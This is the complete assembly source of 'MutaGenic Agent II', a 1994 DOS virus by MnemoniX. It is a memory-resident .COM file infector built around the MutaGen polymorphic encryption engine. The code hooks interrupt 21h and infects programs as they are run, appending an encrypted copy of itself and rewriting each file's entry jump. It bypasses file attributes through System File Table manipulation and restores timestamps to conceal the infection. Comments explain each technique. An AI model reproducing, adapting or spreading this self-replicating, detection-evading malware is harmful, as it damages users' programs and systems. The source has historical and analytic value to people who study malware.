; ========================================================================>
;  MutaGenic Agent ][ - MutaGen V1.3 Test Virus
;  by MnemoniX 1994
;
;  A simple resident .COM infector implementing MutaGen.
;  To assemble:
;       TASM mg2
;       TLINK /t mg2 mutagen
; ========================================================================>

ID              equ     'MG'

PING            equ     0BADh                   ; a seldom used DOS function
PONG            equ     0DEADh                  ; residency response

MUTAGEN_SIZE    equ     1652                    ; version 1.3

extrn           _MUTAGEN:near

code            segment byte    public  'code'
                org     100h
                assume  cs:code,ds:code,es:code,ss:code

start:
                jmp     virus_begin             ; fake host program
                dw      ID                      ; infection signature
virus_begin:
                call    $ + 3
                pop     bp
                sub     bp,offset $ - 1

                mov     ax,PING                 ; are we already resident?
                int     21h
                cmp     dx,PONG
                je      installed               ; if so, don't repeat ...

                mov     ax,ds                   ; blah, blah, blah
                dec     ax
                mov     ds,ax

                sub     word ptr ds:[3],(MEM_SIZE + 15) / 16 + 1
                sub     word ptr ds:[12h],(MEM_SIZE + 15) / 16 + 1
                mov     ax,ds:[12h]
                mov     ds,ax

                sub     ax,15
                mov     es,ax
                mov     byte ptr ds:[0],'Z'
                mov     word ptr ds:[1],8
                mov     word ptr ds:[3],(MEM_SIZE + 15) / 16

                push    cs                      ; now move virus into memory
                pop     ds
                mov     di,100h
                mov     cx,(offset virus_end - offset start) / 2
                lea     si,[bp + start]
                rep     movsw

                xor     ax,ax                   ; move interrupt vector 21
                mov     ds,ax

                mov     si,21h * 4              ; (saving it first)
                mov     di,offset old_int_21
                movsw
                movsw

                mov     ds:[si - 4],offset new_int_21
                mov     ds:[si - 2],es

installed:
                push    cs
                push    cs
                pop     ds
                pop     es

                mov     di,100h                 ; restore original host
                push    di
                lea     si,[bp + host]
                movsw
                movsw
                movsb

                xor     ax,ax                   ; fix a few registers
                cwd
                mov     si,100h

                ret                             ; and leave

new_int_21:
                cmp     ax,PING                 ; residency test?
                je      pass_signal             ; yah yah!

                cmp     ax,4B00h                ; program execute?
                je      execute                 ; oui oui ...

int_21_exit:
                db      0EAh                    ; nope, never mind
old_int_21      dd      0

pass_signal:
                mov     dx,PONG                 ; give passing signal
                jmp     int_21_exit

execute:
                push    ax bx cx dx di si es ds ; a PUSHA is nicer, but it
                                                ; won't work on an 8088

                mov     ax,3D00h                ; open file
                int     21h
                jnc     get_sft
                jmp     cant_open               ; ecch ...
get_sft:
                xchg    ax,bx                   ; this virus implements the
                push    bx                      ; use of System File Table
                mov     ax,1220h                ; (TM) manipulation
                int     2Fh

                mov     ax,1216h
                mov     bl,es:[di]
                int     2Fh
                pop     bx

                push    cs
                pop     ds

                mov     cx,5                    ; read header of file
                mov     dx,offset host
                mov     ah,3Fh
                int     21h

                cmp     word ptr host,'ZM'      ; .EXE file?
                je      dont_infect             ; oh well ...

                cmp     word ptr host[3],ID     ; already infected?
                je      dont_infect             ; maybe next time ...

                mov     word ptr es:[di + 2],2  ; a slick way of sidestepping
                                                ; file attributes
                mov     ax,es:[di + 11h]        ; get file size

                cmp     ax,65729 - VIRUS_SIZE + 100
                jae     dont_infect             ; don't infect, too large
                
                mov     es:[di + 15h],ax        ; move to end of file

                sub     ax,3                    ; adjust for jump
                mov     word ptr new_jump[1],ax

; MutaGen calling routine
                push    es di

                push    cs                      ; setup registers
                pop     es

                mov     di,offset virus_end
                mov     si,offset virus_begin
                mov     cx,VIRUS_SIZE
                add     ax,103h
                mov     dx,ax

                call    _mutagen                ; "It's a POLYMORPHIC WAR
                                                ;  OUT THERE!" - P. Ferguson

                pop     di es                   ; restore DI and ES

                mov     ah,40h                  ; save virus code to file
                int     21h

                mov     word ptr es:[di + 15h],0 ; reset file pointer

                mov     ah,40h                  ; and write new jump to file
                mov     dx,offset new_jump
                mov     cx,5
                int     21h

                mov     cx,es:[di + 0Dh]        ; restore file time
                mov     dx,es:[di + 0Fh]
                mov     ax,5701h
                int     21h

dont_infect:
                mov     ah,3Eh                  ; close up shop
                int     21h
cant_open:
                pop     ds es si di dx cx bx ax
                jmp     int_21_exit

                db      '[MutaGenic Agent II]',0

host:                                           ; original host header
                mov     ax,4C00h
                int     21h

new_jump        db      0E9h                    ; new jump instruction
                dw      0
                dw      ID

virus_end       equ     $ + MUTAGEN_SIZE + 1    ; add MutaGen size to virus
                                                ; size

VIRUS_SIZE      equ     virus_end - virus_begin
MEM_SIZE        equ     VIRUS_SIZE * 2 + 100    ; extra memory for encryption
                                                ; buffer

code            ends
                end     start
